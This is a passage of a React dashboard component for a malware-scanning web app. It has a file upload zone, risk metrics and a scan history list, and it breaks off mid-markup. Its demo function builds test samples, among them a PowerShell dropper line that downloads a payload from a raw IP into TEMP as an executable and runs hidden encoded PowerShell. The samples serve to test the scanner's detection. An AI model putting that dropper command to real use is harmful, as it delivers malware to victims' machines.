import React, { useEffect, useState, useRef } from 'react';
import {
  Shield,
  ShieldAlert,
  ShieldCheck,
  AlertTriangle,
  Upload,
  HardDrive,
  Search,
  FileCode,
  Check,
  Copy,
  RefreshCw,
  Network,
  Play,
  Sparkles,
  CheckCircle2,
  XCircle,
  ArrowUpRight,
  AlertCircle,
} from 'lucide-react';
import {
  PieChart,
  Pie,
  Cell,
  ResponsiveContainer,
  Tooltip,
} from 'recharts';
import { api } from '../services/api';
import { MetricsOverview, InvestigationSummary, EvidenceItem } from '../types';
import { ScanVerdictModal } from '../components/modals/ScanVerdictModal';

interface OverviewProps {
  onSelectInvestigation: (id: string) => void;
  onNavigateToInvestigate: () => void;
  onNavigateToDefense?: (id: string) => void;
  onNavigateToGraph?: (id: string) => void;
}

export const Overview: React.FC<OverviewProps> = ({
  onSelectInvestigation,
  onNavigateToInvestigate,
  onNavigateToDefense,
  onNavigateToGraph,
}) => {
  const [metrics, setMetrics] = useState<MetricsOverview | null>(null);
  const [investigations, setInvestigations] = useState<InvestigationSummary[]>([]);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState<string | null>(null);
  const [riskFilter, setRiskFilter] = useState<'ALL' | 'CRITICAL' | 'HIGH' | 'MEDIUM' | 'LOW' | 'THREATS'>('ALL');
  const [searchQuery, setSearchQuery] = useState('');
  const [launchingDemo, setLaunchingDemo] = useState<string | null>(null);
  const [copiedSha, setCopiedSha] = useState<string | null>(null);

  // Direct In-Home File Scanner State (Super easy for any user)
  const [dragActive, setDragActive] = useState(false);
  const [scanning, setScanning] = useState(false);
  const [scanStage, setScanStage] = useState('');
  const [scanVerdict, setScanVerdict] = useState<InvestigationSummary | null>(null);
  const [scanEvidence, setScanEvidence] = useState<EvidenceItem[]>([]);
  const [scanPopupOpen, setScanPopupOpen] = useState(false);
  const [scanError, setScanError] = useState<string | null>(null);
  const [quickPreviewInv, setQuickPreviewInv] = useState<InvestigationSummary | null>(null);
  const fileInputRef = useRef<HTMLInputElement>(null);

  const fetchData = async () => {
    setLoading(true);
    let metricsData: MetricsOverview | null = null;
    let invsData: InvestigationSummary[] = [];
    let errMessage: string | null = null;

    try {
      metricsData = await api.getMetricsOverview();
    } catch (err: any) {
      console.warn('Backend metrics fetch notice:', err);
      errMessage = err.message || 'Connecting to backend';
    }

    try {
      invsData = await api.getInvestigations({ limit: 50 });
    } catch (err: any) {
      console.warn('Backend investigations fetch notice:', err);
      if (!errMessage) errMessage = err.message || 'Connecting to backend';
    }

    if (metricsData) {
      setMetrics(metricsData);
    }
    if (invsData && invsData.length > 0) {
      setInvestigations(invsData);
    }

    setError(errMessage);
    setLoading(false);
  };

  useEffect(() => {
    fetchData();
  }, []);

  const handleScanFile = async (file: File) => {
    try {
      setScanning(true);
      setScanError(null);
      setScanVerdict(null);
      setScanEvidence([]);

      setScanStage('Safely quarantining file in sandbox...');
      await new Promise((r) => setTimeout(r, 400));

      setScanStage('Extracting metadata, Shannon entropy & IOCs...');
      await new Promise((r) => setTimeout(r, 450));

      setScanStage('Running AI Random Forest & YARA signature classification...');
      const response = await api.analyzeFile(file);

      setScanStage('Synthesizing risk report & defense plan...');
      await new Promise((r) => setTimeout(r, 350));

      const [invDetail, evList] = await Promise.all([
        api.getInvestigation(response.id),
        api.getEvidence(response.id),
      ]);
      setScanVerdict(invDetail);
      setScanEvidence(evList || []);

      // Trigger the interactive verdict popup card immediately!
      setScanPopupOpen(true);

      // Refresh list
      fetchData();
    } catch (err: any) {
      console.error('Scan error:', err);
      setScanError(err.message || 'Unable to scan this file. Please verify backend is running.');
    } finally {
      setScanning(false);
      setScanStage('');
    }
  };

  const handleDrop = (e: React.DragEvent) => {
    e.preventDefault();
    setDragActive(false);
    if (e.dataTransfer.files && e.dataTransfer.files[0]) {
      handleScanFile(e.dataTransfer.files[0]);
    }
  };

  const handleFileChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    if (e.target.files && e.target.files[0]) {
      handleScanFile(e.target.files[0]);
    }
  };

  const handleLaunchQuickDemo = async (sampleType: 'exploit' | 'powershell' | 'safe') => {
    try {
      setLaunchingDemo(sampleType);
      let content = '';
      let filename = '';
      if (sampleType === 'exploit') {
        content = '%PDF-1.4\n1 0 obj\n<< /Type /Catalog /Pages 2 0 R /OpenAction 4 0 R >>\nendobj\n2 0 obj\n<< /Type /Pages /Kids [] /Count 0 >>\nendobj\n4 0 obj\n<< /Type /Action /S /JavaScript /JS (app.alert("http://malicious-c2-update.org/payload.exe");) >>\nendobj\nxref\n0 5\n0000000000 65535 f\n0000000009 00000 n\n0000000074 00000 n\n0000000133 00000 n\n0000000204 00000 n\ntrailer\n<< /Size 5 /Root 1 0 R >>\nstartxref\n340\n%%EOF';
        filename = 'urgent_action_document.pdf';
      } else if (sampleType === 'powershell') {
        content = '$wc = New-Object System.Net.WebClient\n$wc.DownloadFile("http://185.196.11.42/payload.bin", "$env:TEMP\\agent.exe")\npowershell -w hidden -enc aQB3AHIA...';
        filename = 'interactive_dropper_script.ps1';
      } else {
        content = 'ARGUS Verification Safe Sample\nStatus: Clean\nHash Integrity: Verified Nonce\nZero payload detected.';
        filename = 'ARGUS_safe_test_sample.txt';
      }
      const file = new File([content], filename, { type: 'application/octet-stream' });
      await handleScanFile(file);
    } catch (err: any) {
      alert(`Demo scan notice: ${err.message}`);
    } finally {
      setLaunchingDemo(null);
    }
  };

  const copyToClipboard = (text: string, id: string) => {
    navigator.clipboard.writeText(text);
    setCopiedSha(id);
    setTimeout(() => setCopiedSha(null), 2000);
  };

  const totalCount = metrics?.total_investigations || investigations.length || 0;
  const totalThreats = (metrics?.critical_risk_count || 0) + (metrics?.high_risk_count || 0);
  const lowCount = metrics?.low_risk_count || 0;

  // 4 Vibrant Top Stat Cards in Clean White Theme
  const statCards = [
    {
      id: 'ALL' as const,
      title: 'Total Files Scanned',
      value: metrics?.total_investigations || investigations.length || 0,
      sub: 'All analyzed files in database',
      badge: 'All Files',
      icon: HardDrive,
      borderClass: 'border-slate-200 hover:border-blue-400',
      activeBorderClass: 'border-blue-500 ring-2 ring-blue-500/20 bg-blue-50/50',
      iconBg: 'bg-blue-50 text-blue-600 border border-blue-200',
      badgeClass: 'text-blue-700 bg-blue-50 border border-blue-200',
    },
    {
      id: 'THREATS' as const,
      title: 'Threats Detected',
      value: totalThreats,
      sub: `${metrics?.critical_risk_count || 0} Critical • ${metrics?.high_risk_count || 0} High`,
      badge: 'Malware Found',
      icon: ShieldAlert,
      borderClass: 'border-slate-200 hover:border-rose-400',
      activeBorderClass: 'border-rose-500 ring-2 ring-rose-500/20 bg-rose-50/50',
      iconBg: 'bg-rose-50 text-rose-600 border border-rose-200',
      badgeClass: 'text-rose-700 bg-rose-50 border border-rose-200',
    },
    {
      id: 'CRITICAL' as const,
      title: 'Critical Incidents',
      value: metrics?.critical_risk_count || 0,
      sub: 'Score 85–100 • Immediate action',
      badge: 'High Danger',
      icon: AlertTriangle,
      borderClass: 'border-slate-200 hover:border-orange-400',
      activeBorderClass: 'border-orange-500 ring-2 ring-orange-500/20 bg-orange-50/50',
      iconBg: 'bg-orange-50 text-orange-600 border border-orange-200',
      badgeClass: 'text-orange-700 bg-orange-50 border border-orange-200',
    },
    {
      id: 'LOW' as const,
      title: 'Clean & Safe Files',
      value: lowCount,
      sub: 'Score 0–29 • Verified harmless',
      badge: 'Clean',
      icon: ShieldCheck,
      borderClass: 'border-slate-200 hover:border-emerald-400',
      activeBorderClass: 'border-emerald-500 ring-2 ring-emerald-500/20 bg-emerald-50/50',
      iconBg: 'bg-emerald-50 text-emerald-600 border border-emerald-200',
      badgeClass: 'text-emerald-700 bg-emerald-50 border border-emerald-200',
    },
  ];

  // Colorful palette for the threat distribution chart
  const riskDist = [
    { name: 'Critical', value: metrics?.critical_risk_count || 0, color: '#ef4444' }, // Red 500
    { name: 'High', value: metrics?.high_risk_count || 0, color: '#f97316' },     // Orange 500
    { name: 'Medium', value: metrics?.medium_risk_count || 0, color: '#f59e0b' }, // Amber 500
    { name: 'Low', value: metrics?.low_risk_count || 0, color: '#10b981' },       // Emerald 500
  ];

  const filteredInvestigations = investigations.filter((inv) => {
    let matchesRisk = true;
    if (riskFilter === 'CRITICAL') matchesRisk = inv.risk_level === 'CRITICAL';
    else if (riskFilter === 'HIGH') matchesRisk = inv.risk_level === 'HIGH';
    else if (riskFilter === 'MEDIUM') matchesRisk = inv.risk_level === 'MEDIUM';
    else if (riskFilter === 'LOW') matchesRisk = inv.risk_level === 'LOW';
    else if (riskFilter === 'THREATS') matchesRisk = inv.risk_level === 'CRITICAL' || inv.risk_level === 'HIGH';

    const matchesSearch =
      searchQuery === '' ||
      inv.original_name.toLowerCase().includes(searchQuery.toLowerCase()) ||
      inv.sha256.toLowerCase().includes(searchQuery.toLowerCase());

    return matchesRisk && matchesSearch;
  });

  if (loading && !metrics && investigations.length === 0) {
    return (
      <div className="flex flex-col items-center justify-center min-h-[50vh] gap-3">
        <RefreshCw className="w-8 h-8 text-indigo-600 animate-spin" />
        <span className="text-sm text-slate-600 font-medium">Starting ARGUS Security Engine...</span>
      </div>
    );
  }

  return (
    <div className="space-y-6 max-w-7xl mx-auto pb-10">
      {/* ======================================================== */}
      {/* 1. HERO FILE SCANNER: EASY ENOUGH FOR ANYONE TO USE      */}
      {/* ======================================================== */}
      <div className="relative overflow-hidden rounded-3xl border border-slate-200 bg-gradient-to-b from-white via-slate-50/50 to-white p-6 sm:p-8 shadow-sm">
        {/* Subtle decorative glowing background blur */}
        <div className="absolute top-0 right-1/4 -mt-12 w-96 h-96 bg-indigo-500/5 rounded-full blur-3xl pointer-events-none" />
        <div className="absolute bottom-0 left-10 -mb-12 w-80 h-80 bg-blue-500/5 rounded-full blur-3xl pointer-events-none" />

        <div className="relative z-10 flex flex-col items-center text-center max-w-3xl mx-auto">
          {/* Friendly pill badge */}
          <div className="inline-flex items-center gap-2 px-3 py-1 rounded-full bg-indigo-50 border border-indigo-200 text-indigo-700 text-xs font-semibold mb-3">
            <Sparkles className="w-3.5 h-3.5 text-indigo-600" />
            <span>Instant AI Malware & Threat Scanner</span>
          </div>

          <h1 className="text-2xl sm:text-3xl font-extrabold text-slate-900 tracking-tight">
            Check Any File For Viruses & Hidden Threats
          </h1>
          <p className="text-sm text-slate-600 mt-2 max-w-xl">
            Drop any document, script, or program below. We safely scan its structure, check known virus signatures, and use AI to tell you if it's safe—without running it on your device.
          </p>

          {/* DRAG AND DROP ZONE */}
          <div
            onDragOver={(e) => {
              e.preventDefault();
              setDragActive(true);
            }}
            onDragLeave={() => setDragActive(false)}
            onDrop={handleDrop}
            onClick={() => fileInputRef.current?.click()}
            className={`w-full mt-6 p-6 sm:p-8 rounded-2xl border-2 border-dashed transition-all cursor-pointer select-none flex flex-col items-center justify-center gap-3 ${
              dragActive
                ? 'border-indigo-500 bg-indigo-50/80 scale-[1.01]'
                : scanning
                ? 'border-indigo-400 bg-slate-50 cursor-wait'
                : 'border-slate-300 hover:border-indigo-500 bg-white hover:bg-indigo-50/20 shadow-2xs'
            }`}
          >
            <input
              ref={fileInputRef}
              type="file"
              onChange={handleFileChange}
              className="hidden"
            />

            {scanning ? (
              <div className="flex flex-col items-center gap-3 py-2">
                <div className="relative">
                  <div className="w-12 h-12 rounded-full border-3 border-indigo-200 border-t-indigo-600 animate-spin" />
                  <Shield className="w-6 h-6 text-indigo-600 absolute top-3 left-3" />
                </div>
                <div className="text-center">
                  <div className="text-sm font-bold text-slate-900">Scanning Sample...</div>
                  <div className="text-xs text-indigo-600 font-mono mt-0.5 font-medium">{scanStage}</div>
                </div>
              </div>
            ) : (
              <>
                <div className="w-14 h-14 rounded-2xl bg-indigo-50 border border-indigo-200 flex items-center justify-center text-indigo-600 shadow-xs">
                  <Upload className="w-7 h-7" />
                </div>
                <div>
                  <div className="text-base font-bold text-slate-900">
                    Drag & Drop any file here, or <span className="text-indigo-600 underline underline-offset-2">click to browse</span>
                  </div>
                  <div className="text-xs text-slate-500 mt-1">
                    Supports PDF, EXE, PowerShell (.ps1), ZIP, Word, or any suspicious file (Max 100MB)
                  </div>
                </div>
              </>
            )}
          </div>

          {/* SCAN VERDICT CARD (Appears immediately after scan) */}
          {scanVerdict && !scanning && (
            <div
              className={`w-full mt-5 p-5 rounded-2xl border text-left transition-all animate-in fade-in slide-in-from-top-2 duration-300 bg-white shadow-md ${
                scanVerdict.risk_level === 'CRITICAL' || scanVerdict.risk_level === 'HIGH'
                  ? 'border-rose-300'
                  : scanVerdict.risk_level === 'MEDIUM'
                  ? 'border-amber-300'
                  : 'border-emerald-300'
              }`}
            >
              <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-4">
                <div className="flex items-start gap-3.5">
                  {scanVerdict.risk_level === 'CRITICAL' || scanVerdict.risk_level === 'HIGH' ? (
                    <div className="w-10 h-10 rounded-2xl bg-rose-50 border border-rose-200 flex items-center justify-center text-rose-600 shrink-0">
                      <XCircle className="w-6 h-6" />
                    </div>
                  ) : scanVerdict.risk_level === 'MEDIUM' ? (
                    <div className="w-10 h-10 rounded-2xl bg-amber-50 border border-amber-200 flex items-center justify-center text-amber-600 shrink-0">
                      <AlertTriangle className="w-6 h-6" />
                    </div>
                  ) : (
                    <div className="w-10 h-10 rounded-2xl bg-emerald-50 border border-emerald-200 flex items-center justify-center text-emerald-600 shrink-0">
                      <CheckCircle2 className="w-6 h-6" />
                    </div>
                  )}

                  <div>
                    <div className="flex items-center gap-2">
                      <span className="text-base font-bold text-slate-900">
                        {scanVerdict.risk_level === 'CRITICAL' || scanVerdict.risk_level === 'HIGH'
                          ? '🚨 Threat Detected: High Risk File!'
                          : scanVerdict.risk_level === 'MEDIUM'
                          ? '⚠️ Suspicious Elements Found'
                          : '✅ File is Safe & Clean'}
                      </span>
                      <span
                        className={`text-xs font-mono font-bold px-2.5 py-0.5 rounded-full ${
                          scanVerdict.risk_level === 'CRITICAL' || scanVerdict.risk_level === 'HIGH'
                            ? 'bg-rose-50 text-rose-700 border border-rose-200'
                            : scanVerdict.risk_level === 'MEDIUM'
                            ? 'bg-amber-50 text-amber-700 border border-amber-200'
                            : 'bg-emerald-50 text-emerald-700 border border-emerald-200'
                        }`}
                      >
                        Score: {scanVerdict.risk_score} / 100 ({scanVerdict.risk_level})
                      </span>
                    </div>

                    <p className="text-xs text-slate-600 mt-1">
                      File: <strong className="text-slate-900">{scanVerdict.original_name}</strong> •{' '}
                      {scanVerdict.risk_level === 'LOW'
                        ? 'No malicious scripts, zero hidden exploits, and clean byte structure verified.'
                        : 'Identified hostile signatures, suspicious byte patterns, or automated execution triggers.'}
                    </p>
                  </div>
                </div>

                {/* 1-Click Action Buttons */}
                <div className="flex items-center gap-2 shrink-0">
                  <button
                    onClick={() => setQuickPreviewInv(scanVerdict)}
                    className="px-3.5 py-2 rounded-xl bg-slate-100 hover:bg-slate-200 text-slate-700 text-xs font-semibold border border-slate-200 transition-colors cursor-pointer"
                  >
                    Quick View
                  </button>

                  <button
                    onClick={() => onSelectInvestigation(scanVerdict.id)}
                    className="px-3.5 py-2 rounded-xl bg-indigo-50 hover:bg-indigo-100 text-indigo-700 text-xs font-semibold border border-indigo-200 transition-colors cursor-pointer"
                  >
                    View Details
                  </button>

                  {onNavigateToDefense && (scanVerdict.risk_level === 'CRITICAL' || scanVerdict.risk_level === 'HIGH') && (
                    <button
                      onClick={() => onNavigateToDefense(scanVerdict.id)}
                      className="px-3.5 py-2 rounded-xl bg-gradient-to-r from-rose-600 to-red-600 hover:from-rose-700 hover:to-red-700 text-white text-xs font-semibold shadow-sm transition-all cursor-pointer flex items-center gap-1.5"
                    >
                      <Shield className="w-3.5 h-3.5" />
                      <span>Fix & Defend</span>
                    </button>
                  )}

                  <button
                    onClick={() => {
                      setScanVerdict(null);
                      setScanError(null);
                    }}
                    className="p-2 rounded-xl hover:bg-slate-100 text-slate-400 hover:text-slate-700 transition-colors cursor-pointer text-xs"
                    title="Dismiss"
                  >
                    ✕
                  </button>
                </div>
              </div>
            </div>
          )}

          {scanError && (
            <div className="w-full mt-4 p-3 rounded-xl bg-rose-50 border border-rose-200 text-rose-800 text-xs flex items-center justify-between">
              <span className="flex items-center gap-2">
                <AlertCircle className="w-4 h-4 shrink-0 text-rose-600" />
                <span>{scanError}</span>
              </span>
              <button
                onClick={() => setScanError(null)}
                className="text-xs hover:text-rose-950 underline cursor-pointer ml-2"
              >
                Dismiss
              </button>
            </div>
          )}

          {/* QUICK 1-CLICK TEST BUTTONS */}
          <div className="mt-5 flex flex-wrap items-center justify-center gap-2 text-xs">
            <span className="text-slate-500 text-xs font-medium mr-1">Or test with a ready sample:</span>

            <button
              onClick={() => handleLaunchQuickDemo('safe')}
              disabled={!!launchingDemo || scanning}
              className="px-3.5 py-1.5 rounded-full bg-emerald-50 hover:bg-emerald-100 text-emerald-800 border border-emerald-200 font-semibold flex items-center gap-1.5 transition-all cursor-pointer shadow-xs"
              title="Test with a clean, low-risk file"
            >
              {launchingDemo === 'safe' ? <RefreshCw className="w-3.5 h-3.5 animate-spin" /> : <Play className="w-3.5 h-3.5 fill-current" />}
              <span>🟢 Test Clean File (Safe)</span>
            </button>

            <button
              onClick={() => handleLaunchQuickDemo('exploit')}
              disabled={!!launchingDemo || scanning}
              className="px-3.5 py-1.5 rounded-full bg-rose-50 hover:bg-rose-100 text-rose-800 border border-rose-200 font-semibold flex items-center gap-1.5 transition-all cursor-pointer shadow-xs"
              title="Test with a dangerous PDF exploit sample"
            >
              {launchingDemo === 'exploit' ? <RefreshCw className="w-3.5 h-3.5 animate-spin" /> : <Play className="w-3.5 h-3.5 fill-current" />}
              <span>🔴 Test Dangerous Exploit</span>
            </button>

            <button
              onClick={() => handleLaunchQuickDemo('powershell')}
              disabled={!!launchingDemo || scanning}
              className="px-3.5 py-1.5 rounded-full bg-amber-50 hover:bg-amber-100 text-amber-800 border border-amber-200 font-semibold flex items-center gap-1.5 transition-all cursor-pointer shadow-xs"
              title="Test with an obfuscated dropper script"
            >
              {launchingDemo === 'powershell' ? <RefreshCw className="w-3.5 h-3.5 animate-spin" /> : <Play className="w-3.5 h-3.5 fill-current" />}
              <span>🟡 Test Script Dropper</span>
            </button>
          </div>
        </div>
      </div>

      {/* ======================================================== */}
      {/* 2. TOP 4 COLORFUL STAT CARDS (Interactive Quick Filters)  */}
      {/* ======================================================== */}
      <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-4">
        {statCards.map((c) => {
          const Icon = c.icon;
          const isActive = riskFilter === c.id;
          return (
            <div
              key={c.id}
              onClick={() => setRiskFilter(isActive ? 'ALL' : c.id)}
              className={`p-5 rounded-2xl border transition-all cursor-pointer select-none bg-white shadow-xs hover:shadow-md ${
                isActive ? c.activeBorderClass : c.borderClass
              }`}
            >
              <div className="flex items-center justify-between mb-2">
                <span className="text-xs font-semibold text-slate-500">{c.title}</span>
                <div className={`p-2.5 rounded-xl ${c.iconBg}`}>
                  <Icon className="w-4 h-4" />
                </div>
              </div>
              <div className="text-2xl sm:text-3xl font-extrabold text-slate-900 tracking-tight">{c.value}</div>
              <div className="flex items-center justify-between text-xs text-slate-500 mt-2">
                <span>{c.sub}</span>
                <span className={`text-[10px] font-bold px-2.5 py-0.5 rounded-full ${c.badgeClass}`}>
                  {isActive ? 'Active' : c.badge}
                </span>
              </div>
            </div>
          );
        })}
      </div>

      {/* ======================================================== */}
      {/* 3. RECENT FILE SCANS & INVESTIGATIONS LIST               */}
      {/* ======================================================== */}
      <div className="p-5 sm:p-6 rounded-3xl border border-slate-200 bg-white shadow-xs space-y-4">
        <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-3 pb-3 border-b border-slate-100">
          <div>
            <h2 className="text-base font-bold text-slate-900 flex items-center gap-2">
              <FileCode className="w-4 h-4 text-indigo-600" />
              <span>Scanned Files History</span>
            </h2>
            <p className="text-xs text-slate-500 mt-0.5">
              Click any file or 'Quick View' to view complete forensics, attack graphs, and defensive fixes.
            </p>
          </div>

          <div className="flex items-center gap-2">
            <button
              onClick={fetchData}
              className="flex items-center gap-1.5 px-3 py-1.5 rounded-xl bg-slate-50 hover:bg-slate-100 text-slate-700 text-xs font-medium border border-slate-200 cursor-pointer transition-colors"
              title="Refresh investigations"
            >
              <RefreshCw className="w-3.5 h-3.5" />
              <span>Refresh</span>
            </button>

            {riskFilter !== 'ALL' && (
              <button
                onClick={() => setRiskFilter('ALL')}
                className="text-xs text-indigo-600 hover:text-indigo-800 underline font-semibold cursor-pointer"
              >
                Clear Filter ({riskFilter})
              </button>
            )}
          </div>
        </div>

        {/* Filter Search Input and Severity Buttons */}
        <div className="flex flex-col sm:flex-row items-stretch sm:items-center justify-between gap-3">
          <div className="relative flex-1">
            <input
              type="text"
              value={searchQuery}
              onChange={(e) => setSearchQuery(e.target.value)}
              placeholder="Search by file name or SHA-256..."
              className="w-full px-3.5 py-2 pl-9 rounded-xl bg-slate-50 border border-slate-200 text-slate-900 text-xs focus:outline-none focus:border-indigo-500 placeholder:text-slate-400 transition-colors"
            />
            <Search className="w-4 h-4 text-slate-400 absolute left-3 top-2.5 pointer-events-none" />
          </div>

          <div className="flex items-center gap-1.5 overflow-x-auto pb-1 sm:pb-0 text-xs">
            <button
              onClick={() => setRiskFilter('ALL')}
              className={`px-3 py-1.5 rounded-xl font-semibold transition-all cursor-pointer shrink-0 text-xs ${
                riskFilter === 'ALL'
                  ? 'bg-indigo-600 text-white shadow-xs'
                  : 'bg-slate-100 text-slate-700 hover:bg-slate-200'
              }`}
            >
              All ({investigations.length})
            </button>
            <button
              onClick={() => setRiskFilter('THREATS')}
              className={`px-3 py-1.5 rounded-xl font-semibold transition-all cursor-pointer shrink-0 text-xs ${
                riskFilter === 'THREATS'
                  ? 'bg-rose-600 text-white shadow-xs'
                  : 'bg-slate-100 text-slate-700 hover:bg-slate-200'
              }`}
            >
              Threats ({totalThreats})
            </button>
            <button
              onClick={() => setRiskFilter('LOW')}
              className={`px-3 py-1.5 rounded-xl font-semibold transition-all cursor-pointer shrink-0 text-xs ${
                riskFilter === 'LOW'
                  ? 'bg-emerald-600 text-white shadow-xs'
                  : 'bg-slate-100 text-slate-700 hover:bg-slate-200'
              }`}
            >
              Clean ({lowCount})
            </button>
          </div>
        </div>

        {/* Investigations List */}
        {filteredInvestigations.length === 0 ? (
          <div className="py-12 text-center text-xs text-slate-500 space-y-2">
            <div>No file scans match current filter ({riskFilter}).</div>
            <button
              onClick={() => {
                setRiskFilter('ALL');
                setSearchQuery('');
              }}
              className="px-3.5 py-1.5 rounded-xl bg-slate-100 text-slate-700 text-xs cursor-pointer hover:bg-slate-200 font-semibold"
            >
              Reset Filters
            </button>
          </div>
        ) : (
          <div className="space-y-2.5 max-h-[460px] overflow-y-auto pr-1">
            {filteredInvestigations.map((inv) => {
              const isCrit = inv.risk_level === 'CRITICAL';
              const isHigh = inv.risk_level === 'HIGH';
              const isMed = inv.risk_level === 'MEDIUM';
              const isLow = inv.risk_level === 'LOW';

              let badgeColor = 'bg-emerald-50 text-emerald-700 border-emerald-200';
              let verdictLabel = 'SAFE / CLEAN';
              if (isCrit) {
                badgeColor = 'bg-rose-50 text-rose-700 border-rose-200 font-bold';
                verdictLabel = 'CRITICAL THREAT';
              } else if (isHigh) {
                badgeColor = 'bg-orange-50 text-orange-700 border-orange-200 font-semibold';
                verdictLabel = 'HIGH RISK';
              } else if (isMed) {
                badgeColor = 'bg-amber-50 text-amber-700 border-amber-200';
                verdictLabel = 'SUSPICIOUS';
              }

              return (
                <div
                  key={inv.id}
                  className="p-3.5 sm:p-4 rounded-2xl bg-white hover:bg-slate-50/80 border border-slate-200 transition-all flex flex-col sm:flex-row sm:items-center justify-between gap-3 group shadow-2xs hover:shadow-xs"
                >
                  <div
                    onClick={() => setQuickPreviewInv(inv)}
                    className="overflow-hidden cursor-pointer flex-1"
                  >
                    <div className="flex items-center gap-2.5">
                      <div className={`p-2 rounded-xl ${isLow ? 'bg-emerald-50 text-emerald-600 border border-emerald-100' : 'bg-rose-50 text-rose-600 border border-rose-100'}`}>
                        {isLow ? <ShieldCheck className="w-4 h-4" /> : <ShieldAlert className="w-4 h-4" />}
                      </div>
                      <span className="text-sm font-bold text-slate-900 group-hover:text-indigo-600 transition-colors truncate">
                        {inv.original_name}
                      </span>
                      <span className={`text-[10px] font-mono px-2.5 py-0.5 rounded-full border shrink-0 ${badgeColor}`}>
                        {inv.risk_score} / 100 • {verdictLabel}
                      </span>
                    </div>

                    <div className="flex items-center gap-2 text-xs text-slate-500 font-mono mt-1.5 ml-10">
                      <span>SHA-256: {inv.sha256.substring(0, 16)}...</span>
                      <button
                        type="button"
                        onClick={(e) => {
                          e.stopPropagation();
                          copyToClipboard(inv.sha256, inv.id);
                        }}
                        className="hover:text-slate-900 cursor-pointer text-slate-400"
                        title="Copy SHA-256 Hash"
                      >
                        {copiedSha === inv.id ? <Check className="w-3.5 h-3.5 text-emerald-600" /> : <Copy className="w-3.5 h-3.5" />}
                      </button>
                    </div>
                  </div>

                  {/* 1-Click Direct Action Buttons */}
                  <div className="flex items-center gap-1.5 shrink-0 ml-10 sm:ml-0">
                    <button
                      onClick={() => setQuickPreviewInv(inv)}
                      className="px-3 py-1.5 rounded-xl bg-slate-50 hover:bg-slate-100 text-slate-700 text-xs font-semibold border border-slate-200 cursor-pointer transition-colors"
                      title="Quick View Popup Card"
                    >
                      Quick View
                    </button>

                    <button
                      onClick={() => onSelectInvestigation(inv.id)}
                      className="px-3 py-1.5 rounded-xl bg-indigo-50 hover:bg-indigo-100 text-indigo-700 text-xs font-semibold border border-indigo-200 cursor-pointer transition-colors"
                      title="View forensic evidence breakdown"
                    >
                      Evidence
                    </button>

                    {onNavigateToGraph && (
                      <button
                        onClick={() => onNavigateToGraph(inv.id)}
                        className="px-2.5 py-1.5 rounded-xl bg-slate-50 hover:bg-slate-100 text-slate-700 text-xs font-semibold border border-slate-200 flex items-center gap-1 cursor-pointer transition-colors"
                        title="Open Attack Reconstruction Graph"
                      >
                        <Network className="w-3.5 h-3.5 text-slate-500" />
                        <span>Map</span>
                      </button>
                    )}

                    {onNavigateToDefense && (
                      <button
                        onClick={() => onNavigateToDefense(inv.id)}
                        className={`px-3 py-1.5 rounded-xl text-xs font-semibold border flex items-center gap-1 cursor-pointer transition-colors ${
                          isLow
                            ? 'bg-slate-50 hover:bg-slate-100 text-slate-700 border-slate-200'
                            : 'bg-rose-50 hover:bg-rose-100 text-rose-700 border-rose-200'
                        }`}
                        title="Open Automated Defensive Fixes"
                      >
                        <Shield className="w-3.5 h-3.5" />
                        <span>{isLow ? 'Verify Fix' : 'Fix & Defend'}</span>
                      </button>
                    )}

                    <button
                      onClick={() => onSelectInvestigation(inv.id)}
                      className="p-1.5 rounded-lg text-slate-400 hover:text-slate-800 transition-colors"
                    >
                      <ArrowUpRight className="w-4 h-4" />
                    </button>
                  </div>
                </div>
              );
            })}
          </div>
        )}
      </div>

      {/* ======================================================== */}
      {/* 4. THREAT SEVERITY BREAKDOWN & RISK DISTRIBUTION        */}
      {/* ======================================================== */}
      <div className="p-5 sm:p-6 rounded-3xl border border-slate-200 bg-white shadow-xs">
        <div className="flex flex-col sm:flex-row sm:items-center justify-between pb-4 mb-4 border-b border-slate-100 gap-2">
          <div>
            <h3 className="text-sm font-bold text-slate-900">Threat Severity Breakdown & Incident Distribution</h3>
            <p className="text-xs text-slate-500 mt-0.5">Categorization of all analyzed samples by forensic risk rating</p>
          </div>
          <div className="flex items-center gap-2">
            <span className="text-xs text-indigo-600 font-medium">Click category to filter</span>
            {riskFilter !== 'ALL' && (
              <button
                onClick={() => setRiskFilter('ALL')}
                className="text-xs font-semibold text-slate-600 hover:text-slate-900 px-2.5 py-1 rounded-lg bg-slate-100 border border-slate-200 cursor-pointer"
              >
                Clear Filter ({riskFilter})
              </button>
            )}
          </div>
        </div>

        <div className="grid grid-cols-1 lg:grid-cols-12 gap-6 items-center">
          {/* Donut Chart */}
          <div className="lg:col-span-5 h-52 w-full flex items-center justify-center">
            <ResponsiveContainer width="100%" height="100%">
              <PieChart>
                <Pie
                  data={riskDist}
                  cx="50%"
                  cy="50%"
                  innerRadius={50}
                  outerRadius={78}
                  paddingAngle={4}
                  dataKey="value"
                  className="cursor-pointer"
                  onClick={(entry) => {
                    const level = entry.name.toUpperCase();
                    setRiskFilter((prev) => (prev === level ? 'ALL' : (level as any)));
                  }}
                >
                  {riskDist.map((entry, index) => (
                    <Cell
                      key={`cell-${index}`}
                      fill={entry.color}
                      stroke={riskFilter === entry.name.toUpperCase() ? '#0f172a' : '#ffffff'}
                      strokeWidth={riskFilter === entry.name.toUpperCase() ? 2 : 1}
                      className="cursor-pointer hover:opacity-80 transition-opacity"
                    />
                  ))}
                </Pie>
                <Tooltip
                  contentStyle={{
                    backgroundColor: '#ffffff',
                    border: '1px solid #e2e8f0',
                    borderRadius: '12px',
                    fontSize: '12px',
                    color: '#0f172a',
                    boxShadow: '0 4px 6px -1px rgba(0, 0, 0, 0.1)',
                  }}
                />
              </PieChart>
            </ResponsiveContainer>
          </div>

          {/* Interactive Severity Category Cards */}
          <div className="lg:col-span-7 grid grid-cols-1 sm:grid-cols-2 gap-3 text-xs">
            {riskDist.map((item) => {
              const isSelected = riskFilter === item.name.toUpperCase();
              const percent = totalCount > 0 ? ((item.value / totalCount) * 100).toFixed(1) : '0.0';
              return (
                <button
                  key={item.name}
                  onClick={() => setRiskFilter(item.name.toUpperCase() as any)}
                  className={`p-3.5 rounded-2xl border text-left cursor-pointer transition-all flex items-center justify-between ${
                    isSelected
                      ? 'border-indigo-500 bg-indigo-50/50 ring-2 ring-indigo-500/20 shadow-xs'
